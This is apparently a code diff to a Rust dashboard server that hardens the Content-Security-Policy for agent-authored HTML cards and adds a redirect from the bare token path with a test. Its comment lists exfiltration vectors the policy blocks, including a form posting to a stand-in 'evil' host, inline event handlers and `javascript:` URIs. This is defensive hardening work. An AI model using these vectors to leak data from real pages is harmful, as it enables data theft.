@@ -8,12 +8,18 @@ use std::sync::Arc;
 use std::time::Duration;
 use tiny_http::{Header, Method, Response, Server, StatusCode};
 
-// `connect-src 'self'` permits the dashboard's same-origin SSE (`EventSource`)
-// while still blocking egress to any other host — the containment goal. Scripts
-// load only from same origin (`script-src 'self'`, no 'unsafe-inline'), so the
-// page keeps its JS in the served `app.js` and any script an agent-authored
-// card carries stays inert. `img-src 'self' data:` blocks image-based exfil.
-pub const CSP: &str = "default-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'";
+// Containment for agent-authored card HTML. `connect-src 'self'` permits the
+// dashboard's same-origin SSE (`EventSource`) while blocking script-driven
+// egress (fetch/XHR/WS/`<a ping>`) to any other host. `script-src 'self'` (no
+// 'unsafe-inline') keeps JS to the served `app.js`, so inline event-handler
+// attributes (`onerror`, `onclick`, …) and `javascript:` URIs a card carries
+// stay inert. `img-src`/`style-src` block image/CSS network exfil, and
+// `form-action`/`base-uri` are pinned to 'self' because neither falls back to
+// `default-src` — without them a card `<form action="http://evil">` or `<base>`
+// would exfiltrate on submit. RESIDUAL, accepted for the "raw HTML card by
+// design" feature: top-level navigation (`<meta http-equiv=refresh>`, external
+// `<a href>`) is not fully governable by CSP in shipping browsers.
+pub const CSP: &str = "default-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; form-action 'self'; base-uri 'self'";
 
 const SHELL: &str = include_str!("shell.html");
 const APP_JS: &str = include_str!("app.js");
@@ -106,7 +112,13 @@ fn handle(
     let events_path = format!("{base}events");
     let app_js_path = format!("{base}app.js");
 
-    if url == base || url == shell_path {
+    if url == shell_path {
+        // Canonical URL carries the trailing slash so the page's relative refs
+        // (`app.js`, `events`) resolve under `/s/<token>/`. Redirect the bare
+        // form rather than serving a shell whose resources would 404.
+        let resp = Response::empty(StatusCode(301)).with_header(header("Location", &base));
+        let _ = request.respond(resp);
+    } else if url == base {
         let resp = Response::from_string(SHELL)
             .with_header(header("Content-Type", "text/html; charset=utf-8"))
             .with_header(header("Content-Security-Policy", CSP));
@@ -200,6 +212,16 @@ mod tests {
         assert!(resp.starts_with("HTTP/1.1 200"), "got: {resp}");
         assert!(resp.contains("text/javascript"), "wrong content-type: {resp}");
         assert!(resp.contains("EventSource"), "missing script body: {resp}");
+        server.shutdown();
+    }
+
+    #[test]
+    fn bare_token_path_redirects_to_canonical() {
+        let hub = CompanionHub::new();
+        let server = start(hub, 0, "tok123".into()).unwrap();
+        let resp = raw_get(server.port, "/s/tok123");
+        assert!(resp.starts_with("HTTP/1.1 301"), "got: {resp}");
+        assert!(resp.contains("Location: /s/tok123/"), "missing Location: {resp}");
         server.shutdown();
     }
 
